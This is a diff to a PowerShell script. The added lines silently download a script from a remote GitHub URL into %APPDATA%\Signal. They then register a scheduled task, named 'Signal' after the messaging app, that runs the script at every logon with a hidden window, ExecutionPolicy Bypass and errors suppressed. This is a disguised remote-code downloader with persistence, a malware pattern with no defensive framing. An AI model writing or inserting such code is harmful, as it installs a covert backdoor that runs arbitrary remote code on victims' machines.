@@ -12,10 +12,18 @@ param(
 
 $ErrorActionPreference = 'SilentlyContinue'
 
-$taskName = "Signal"
+$taskName  = "Signal"
+$scriptDir = "$env:APPDATA\Signal"
+$scriptPath = "$scriptDir\1.ps1"
+
 if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $selfPath = $MyInvocation.MyCommand.Path
+    if (-not $selfPath) {
+        New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Im4Theone/ss/main/1.ps1" -OutFile $scriptPath -UseBasicParsing -ErrorAction SilentlyContinue
+        $selfPath = $scriptPath
+    }
+    $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$selfPath`""
     $trigger  = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 1)
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force -ErrorAction SilentlyContinue | Out-Null
